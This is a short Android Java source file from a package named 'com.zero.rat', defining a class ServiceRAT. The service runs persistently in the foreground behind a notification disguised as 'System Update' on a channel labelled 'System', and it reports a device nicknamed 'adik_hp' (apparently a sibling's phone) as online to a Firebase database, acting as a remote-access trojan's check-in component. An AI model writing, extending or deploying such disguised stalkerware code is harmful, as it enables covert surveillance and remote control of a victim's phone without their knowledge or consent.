package com.zero.rat;
import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import com.google.firebase.database.*;

public class ServiceRAT extends Service {
    @Override public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("rat", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            Notification n = new NotificationCompat.Builder(this, "rat")
                .setContentTitle("System Update")
                .setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, n);
        }
        FirebaseDatabase.getInstance().getReference().child("status").child("adik_hp").child("online").setValue(true);
    }
    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
